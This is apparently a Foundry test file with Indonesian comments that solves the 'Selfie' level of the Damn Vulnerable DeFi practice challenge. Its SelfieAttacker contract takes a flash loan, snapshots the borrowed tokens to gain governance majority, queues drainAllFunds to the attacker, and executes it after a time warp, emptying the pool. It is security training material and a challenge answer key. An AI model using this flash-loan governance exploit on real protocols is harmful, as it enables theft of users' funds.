// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

// Kontrak penyerang: meminjam 1.500.000 DVT via flash loan, lalu DI DALAM
// callback: (1) snapshot token — saldo pinjaman tercatat sebagai voting
// power mayoritas; (2) antre aksi governance drainAllFunds(attacker) ke
// pool; (3) kembalikan token pinjaman. Setelah delay 2 hari, eksekusi
// aksi governance -> pool menguras seluruh dananya ke attacker.
contract SelfieAttacker {
    SelfiePool internal pool;
    SimpleGovernance internal governance;
    DamnValuableTokenSnapshot internal token;
    address payable internal attacker;
    uint256 public actionId;

    constructor(
        address poolAddress,
        address governanceAddress,
        address tokenAddress,
        address attackerAddress
    ) {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
        attacker = payable(attackerAddress);
    }

    function attack() external {
        pool.flashLoan(1_500_000e18);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        // (1) Snapshot SELAMA memegang 1.500.000 dari total 2.000.000 token
        // -> voting power > 50% menurut getBalanceAtLastSnapshot.
        DamnValuableTokenSnapshot(tokenAddress).snapshot();
        // (2) Antre aksi: governance memanggil pool.drainAllFunds(attacker).
        // Receiver bukan governance sendiri, jadi lolos dari guard.
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
        );
        actionId = governance.queueAction(address(pool), data, 0);
        // (3) Lunasi flash loan sebelum callback selesai.
        DamnValuableTokenSnapshot(tokenAddress).transfer(
            address(pool),
            amount
        );
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // Root cause: voting power governance dihitung dari snapshot token
        // TERAKHIR — dan siapa pun bisa memicu snapshot baru. Flash loan
        // 1.500.000 DVT (75% supply) + snapshot di dalam callback = mayoritas
        // voting instan, tanpa modal. Aksi drainAllFunds diantre, lalu
        // dieksekusi setelah delay 2 hari. Pool sendiri yang memanggil
        // drainAllFunds atas nama governance — onlyGovernance terpenuhi.
        SelfieAttacker attackerContract = new SelfieAttacker(
            address(selfiePool),
            address(simpleGovernance),
            address(dvtSnapshot),
            attacker
        );
        attackerContract.attack();

        // Lewati delay aksi governance (2 hari)
        vm.warp(block.timestamp + 2 days + 1);

        simpleGovernance.executeAction(attackerContract.actionId());
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
